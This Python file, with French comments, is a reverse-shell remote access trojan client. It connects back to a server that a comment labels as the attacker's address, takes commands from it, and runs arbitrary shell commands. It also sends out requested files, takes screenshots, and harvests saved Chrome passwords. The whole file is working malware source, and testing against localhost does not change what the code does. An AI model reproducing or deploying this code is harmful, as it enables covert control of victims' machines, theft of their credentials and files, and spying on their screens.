import socket
import time
import subprocess
import platform
import os
from PIL import ImageGrab
import chromepass 

# HOST_IP = "192.168.1.73" #adresse de l'attaquant    
HOST_IP = socket.gethostbyname(socket.gethostname()) #adresse du pc en cours d'utilisation (utile pour faire des tests)
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion sur {HOST_IP}, port {HOST_PORT}.")
while 1: 
    try: 
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError: 
        print("Erreur: imposible de se connecter au serveur.\nReconnexion...")
        time.sleep(4)
    else: 
        print("Connecté au serveur")
        break
while 1:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande :", commande)


    commande_split = commande.split(" ")
    if commande == "infos": 
        reponse = platform.platform() + ' ' + os.getcwd()
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "cd" :
        try:
            os.chdir(commande_split[1].strip("'"))
        except FileNotFoundError:
            reponse = "Erreur: Ce dossier n'existe pas."
    elif len(commande_split) == 2 and commande_split[0] == "dl" :
        try: 
            f = open(commande_split[1], "rb")
        except FileNotFoundError: 
            reponse = " ".encode
        else: 
            reponse = f.read()
            f.close()
    elif len(commande_split) == 2 and commande_split[0] == "capture" :
        capture_ecran = ImageGrab.grab()
        capture_filename = commande_split[1] +".png"
        capture_ecran.save(capture_filename, "PNG")
        try: 
            f = open(capture_filename, "rb")
        except FileNotFoundError: 
            reponse = " ".encode
        else: 
            reponse = f.read()
            f.close()
    elif len(commande_split) == 1 and commande_split[0] == "password":
        chpass = chromepass.Chromepass()
        reponse = str(chpass.get_passwords()).encode()
    else: 
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        reponse = reponse.encode()
    if not reponse or len(reponse) == 0:
        reponse = " "

    header = str(len(reponse)).zfill(13)
    print("header: ", header)
    s.sendall(header.encode())
    s.sendall(reponse)
    

s.close()